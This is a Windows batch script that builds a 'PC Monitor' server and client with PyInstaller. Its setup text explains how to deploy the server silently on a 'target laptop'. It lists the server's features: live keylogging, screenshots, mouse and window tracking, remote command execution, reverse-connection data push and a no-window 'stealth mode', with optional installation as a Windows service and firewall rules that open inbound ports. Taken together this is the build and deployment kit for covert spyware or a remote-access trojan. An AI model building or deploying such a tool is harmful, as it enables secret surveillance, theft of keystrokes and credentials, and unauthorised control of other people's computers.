@echo off
echo ========================================
echo PC Monitor Build Script - Modular Edition
echo ========================================
echo.

REM Check if PyInstaller is installed
pip show pyinstaller >nul 2>&1
if errorlevel 1 (
    echo Installing PyInstaller...
    pip install pyinstaller
    echo.
)

REM ========================================
REM BUILD CONFIGURATION
REM ========================================
echo Select what to build:
echo 1. Build Server only (PCMonitor.exe)
echo 2. Build Client only (PCMonitorClient.exe)
echo 3. Build Both (Server + Client)
echo.
set /p BUILD_CHOICE="Enter choice (1-3) [default: 3]: "
if "%BUILD_CHOICE%"=="" set BUILD_CHOICE=3

echo.
echo Select console window mode:
echo 1. No console (silent background mode - recommended)
echo 2. With console (see output/debug info)
echo.
set /p CONSOLE_CHOICE="Enter choice (1-2) [default: 1]: "
if "%CONSOLE_CHOICE%"=="" set CONSOLE_CHOICE=1

echo.
echo Select build optimization:
echo 1. Normal (faster build, larger file)
echo 2. Optimized (slower build, smaller file, includes UPX compression)
echo.
set /p OPTIMIZE_CHOICE="Enter choice (1-2) [default: 1]: "
if "%OPTIMIZE_CHOICE%"=="" set OPTIMIZE_CHOICE=1

echo.
echo Select service installation option:
echo 1. Do not install as service
echo 2. Install as Windows service
echo.
set /p SERVICE_CHOICE="Enter choice (1-2) [default: 1]: "
if "%SERVICE_CHOICE%"=="" set SERVICE_CHOICE=1

REM Set console flag
if "%CONSOLE_CHOICE%"=="1" (
    set CONSOLE_FLAG=--noconsole
    echo Using: No console window
) else (
    set CONSOLE_FLAG=--console
    echo Using: Console window enabled
)

REM Set optimization flags
if "%OPTIMIZE_CHOICE%"=="2" (
    set OPTIMIZE_FLAGS=--upx-dir=upx
    echo Using: Optimized build with compression
) else (
    set OPTIMIZE_FLAGS=
    echo Using: Normal build
)

echo.
echo ========================================
echo Starting Build...
echo ========================================
echo.

REM Clean previous builds
if exist build rmdir /s /q build
if exist dist rmdir /s /q dist
if exist *.spec del /q *.spec

REM ========================================
REM BUILD SERVER
REM ========================================
if "%BUILD_CHOICE%"=="1" goto BUILD_SERVER
if "%BUILD_CHOICE%"=="3" goto BUILD_SERVER
goto SKIP_SERVER

:BUILD_SERVER
echo ========================================
echo Building Server (PCMonitor.exe)...
echo ========================================
echo Includes: Core server + Reverse connection module
echo.
pyinstaller --onefile ^
    %CONSOLE_FLAG% ^
    --name "PCMonitor" ^
    --icon=NONE ^
    --hidden-import=flask ^
    --hidden-import=flask_cors ^
    --hidden-import=pynput ^
    --hidden-import=pynput.mouse ^
    --hidden-import=pynput.keyboard ^
    --hidden-import=PIL ^
    --hidden-import=PIL.ImageGrab ^
    --hidden-import=win32gui ^
    --hidden-import=win32process ^
    --hidden-import=psutil ^
    --hidden-import=requests ^
    --collect-all flask ^
    --collect-all flask_cors ^
    %OPTIMIZE_FLAGS% ^
    server.py

if errorlevel 1 (
    echo.
    echo [ERROR] Server build failed!
    echo.
    pause
    exit /b 1
)
echo [SUCCESS] Server built successfully!
echo.

REM Install as service if requested
if "%SERVICE_CHOICE%"=="2" (
    echo.
    echo ========================================
    echo Installing as Windows Service...
    echo ========================================
    
    REM Copy the executable to the dist folder if it's not already there
     if not exist "dist\PCMonitor.exe" (
         echo Error: PCMonitor.exe not found in dist folder
         goto SkipServer
     )
    
    REM Install the service
    echo Installing service...
    dist\PCMonitor.exe install
    
    echo.
    echo Service installation complete!
    echo To start the service, run: dist\PCMonitor.exe start
    echo To stop the service, run: dist\PCMonitor.exe stop
    echo To remove the service, run: dist\PCMonitor.exe remove
)

:SKIP_SERVER

REM ========================================
REM BUILD CLIENT
REM ========================================
if "%BUILD_CHOICE%"=="2" goto BUILD_CLIENT
if "%BUILD_CHOICE%"=="3" goto BUILD_CLIENT
goto SKIP_CLIENT

:BUILD_CLIENT
echo ========================================
echo Building Client (PCMonitorClient.exe)...
echo ========================================
echo Includes: Core client + Callback listener module
echo.
pyinstaller --onefile ^
    %CONSOLE_FLAG% ^
    --name "PCMonitorClient" ^
    --icon=NONE ^
    --hidden-import=PIL ^
    --hidden-import=PIL.Image ^
    --hidden-import=PIL.ImageTk ^
    --hidden-import=tkinter ^
    --hidden-import=requests ^
    --hidden-import=flask ^
    --hidden-import=flask_cors ^
    --collect-all flask ^
    --collect-all flask_cors ^
    %OPTIMIZE_FLAGS% ^
    client.py

if errorlevel 1 (
    echo.
    echo [ERROR] Client build failed!
    echo.
    pause
    exit /b 1
)
echo [SUCCESS] Client built successfully!
echo.

:SKIP_CLIENT

REM ========================================
REM BUILD COMPLETE
REM ========================================
echo.
echo ========================================
echo Build Complete!
echo ========================================
echo.
if "%BUILD_CHOICE%"=="1" (
    echo Server executable: dist\PCMonitor.exe
    dir dist\PCMonitor.exe | find "PCMonitor.exe"
)
if "%BUILD_CHOICE%"=="2" (
    echo Client executable: dist\PCMonitorClient.exe
    dir dist\PCMonitorClient.exe | find "PCMonitorClient.exe"
)
if "%BUILD_CHOICE%"=="3" (
    echo Server executable: dist\PCMonitor.exe
    echo Client executable: dist\PCMonitorClient.exe
    echo.
    dir dist\*.exe
)

echo.
echo ========================================
echo MODULAR STRUCTURE
echo ========================================
echo.
echo SERVER (server.py):
echo   - Core monitoring functionality
echo   - Integrated reverse connection module
echo   - Single executable with all features
echo.
echo CLIENT (client.py):
echo   - Multi-PC monitoring dashboard
echo   - Integrated callback listener module
echo   - Single executable with all features
echo.
echo No separate files needed - everything is self-contained!
echo.
echo ========================================
echo INSTALLATION INSTRUCTIONS
echo ========================================
echo.
echo SERVER SETUP (Target laptop):
echo ----------------------------------------
echo 1. Copy dist\PCMonitor.exe to target laptop
if "%CONSOLE_CHOICE%"=="1" (
    echo 2. Run PCMonitor.exe - it will run silently in background
    echo    ^(Check config.json for API key after first run^)
) else (
    echo 2. Run PCMonitor.exe - console will show API key
)
echo 3. Copy the API key from config.json or console
echo 4. Keep PCMonitor.exe running
echo.
echo OPTIONAL - Enable Reverse Connection:
echo   a. Edit callback_config.json on server
echo   b. Set "enabled": true
echo   c. Set "callback_url" to your client's IP
echo   d. Set matching "callback_key"
echo   e. Restart PCMonitor.exe
echo.
if "%CONSOLE_CHOICE%"=="1" (
    echo NOTE: To see API key, run from command line once:
    echo    PCMonitor.exe
    echo    Then check config.json or the brief console output
    echo.
)
echo ========================================
echo CLIENT SETUP (Your monitoring PC):
echo ----------------------------------------
echo 1. Copy dist\PCMonitorClient.exe to your PC
echo 2. Run PCMonitorClient.exe
echo.
echo STANDARD MODE (Client connects to server):
echo   3. Click "Add Server"
echo   4. Enter server URL (e.g., http://192.168.0.48:5000)
echo   5. Enter the API key from server
echo   6. Click "Add Server"
echo   7. Click "Start" to begin monitoring
echo.
echo REVERSE CONNECTION MODE (Server pushes to client):
echo   3. Go to Tools ^> Callback Listener Settings
echo   4. Enable "Callback Listener"
echo   5. Note your IP and port
echo   6. Set matching callback key
echo   7. Configure server's callback_config.json with your IP
echo   8. Server will automatically push data to you
echo.
echo ========================================
echo FEATURES
echo ========================================
echo.
echo SERVER:
echo   âœ" Live keylogging with text stream
echo   âœ" Automatic ^& manual screenshots
echo   âœ" Mouse click tracking
echo   âœ" Window change monitoring
echo   âœ" Event logging with timestamps
echo   âœ" Remote command execution
echo   âœ" API with authentication
echo   âœ" Reverse connection support (push mode)
echo.
echo CLIENT:
echo   âœ" Multi-PC monitoring in tabs
echo   âœ" Live keystroke feed
echo   âœ" Screenshot gallery with preview
echo   âœ" Event search and filtering
echo   âœ" Remote control panel
echo   âœ" Dashboard overview
echo   âœ" Data export (JSON format)
echo   âœ" Callback listener (receive push data)
echo   âœ" Auto-refresh
echo.
echo ========================================
echo CONNECTION MODES
echo ========================================
echo.
echo STANDARD MODE (Client ^> Server):
echo   - Client polls server for data
echo   - Client needs server's IP address
echo   - Works through NAT/router
echo   - Server doesn't need client's IP
echo.
echo REVERSE MODE (Server ^> Client):
echo   - Server pushes data to client
echo   - Server needs client's static IP
echo   - Client must have open port
echo   - Useful when server IP changes
echo   - Can use both modes simultaneously
echo.
if "%CONSOLE_CHOICE%"=="1" (
    echo ========================================
    echo STEALTH MODE NOTES
    echo ========================================
    echo Server runs with NO visible window
    echo - No taskbar icon
    echo - No console window
    echo - Silent operation
    echo.
    echo To stop server:
    echo - Use Kill Switch from client
    echo - Or use Task Manager to end PCMonitor.exe
    echo.
)
echo ========================================
echo FIREWALL CONFIGURATION
echo ========================================
echo.
echo SERVER (if using standard mode):
echo   Allow inbound on port 5000 (or configured port)
echo   netsh advfirewall firewall add rule name="PC Monitor Server" ^
echo         dir=in action=allow protocol=TCP localport=5000
echo.
echo CLIENT (if using reverse connection mode):
echo   Allow inbound on port 8080 (or configured callback port)
echo   netsh advfirewall firewall add rule name="PC Monitor Callback" ^
echo         dir=in action=allow protocol=TCP localport=8080
echo.
echo ========================================
echo CONFIGURATION FILES
echo ========================================
echo.
echo SERVER generates:
echo   - config.json (API key, port, PC name, etc.)
echo   - callback_config.json (reverse connection settings)
echo   - monitor_data\ (screenshots, logs)
echo.
echo CLIENT generates:
echo   - multi_client_config.json (saved servers, callback settings)
echo   - received_data\ (reverse connection data storage)
echo.
echo ========================================
echo.
echo Press any key to view build folder...
pause >nul
explorer dist
echo.
echo Build process complete!
pause